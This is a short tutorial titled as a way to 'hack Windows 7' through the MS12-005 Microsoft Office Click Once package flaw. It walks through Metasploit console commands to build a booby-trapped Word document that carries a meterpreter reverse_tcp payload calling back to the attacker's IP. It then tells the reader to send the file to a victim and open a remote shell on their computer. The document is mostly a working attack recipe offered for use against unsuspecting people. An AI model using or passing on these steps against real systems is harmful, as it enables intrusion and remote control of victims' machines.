Hack Windows 7 using Microsoft Office Click Once Unsafe Object Package Handling Vulnerability

This module exploits a vulnerability found in Microsoft Office’s Click Once feature. When handling a Macro document, the application fails to recognize certain file extensions as dangerous executables, which can be used to bypass the warning message. This allows you to trick your victim into opening the malicious document, which will load up either a python or ruby payload based on your choosing, and then finally download and execute our executable.
Microsoft Office Word 2007/2010
Windows XP SP 2
Windows 7
Attacker: Backtrack 5
Victim PC: Windows 7
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/ms12_005
Msf exploit (ms12_005)>set payload windows/meterpreter/reverse_tcp
Msf exploit (ms12_005)>set lhost 192.168.1.4 (IP of Local Host)
Msf exploit (ms12_005)>exploit

After we successfully generate the malicious Document File, it will stored on your local computer
/root/.msf4/local/msf.docm

Now send your msf.docm files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
